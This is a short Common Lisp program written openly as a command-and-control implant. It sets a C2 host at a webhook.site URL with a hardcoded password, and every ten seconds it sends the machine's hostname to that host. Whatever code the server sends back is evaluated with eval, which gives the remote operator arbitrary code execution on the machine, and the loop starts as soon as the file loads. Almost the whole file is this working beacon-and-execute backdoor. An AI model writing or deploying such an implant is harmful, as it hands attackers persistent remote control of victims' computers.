(require :sb-bsd-sockets)
(use-package :sb-bsd-sockets)
(ql:quickload :drakma)

(defparameter *c2host* "https://webhook.site/568cf95e-0f99-413e-8326-6d493e013557")
(defparameter *c2password* "secret")

(defun get-hostname ()
  (machine-instance))

(defun linux-p ()
  (find :linux *features*))

(defun windows-p ()
  (find :win32 *features*))

(defun macos-p ()
  (find :darwin *features*))

(defun run-plugin (code)
  (eval (read-from-string code)))

(defun download-plugin (url)
  (format t "Fetching from: ~a~%" url))

(defun heartbeat ()
  (let ((resposnse (drakma:http-request *c2host*
                         :method :post 
                         :parameters (pairlis '("client_password" "implantname") (list *c2password* (get-hostname))))
                                       ))
    (format t "~a~%" resposnse)
    (run-plugin resposnse)))

(defun runner ()
  (loop
    (heartbeat)
    (sleep 10)))

(runner)

